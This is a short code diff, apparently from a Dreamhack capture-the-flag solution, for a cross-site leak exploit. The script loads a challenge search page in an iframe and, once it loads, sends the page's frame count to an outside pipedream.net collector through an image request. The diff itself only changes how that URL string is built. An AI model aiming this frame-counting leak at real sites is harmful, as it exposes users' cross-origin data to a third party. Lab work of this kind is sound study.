@@ -5,6 +5,6 @@
     iframe.src = "http://host3.dreamhack.games:8825/search?query=DreamHack";
     document.body.appendChild(iframe);
     iframe.onload = ()=>{
-        img.src="http://en7007nj6j2rg.x.pipedream.net/?count="+iframe.contentWindow.frames.length   
+        img.src=`http://en7007nj6j2rg.x.pipedream.net/?count=${iframe.contentWindow.frames.length}`
     };
 </script>
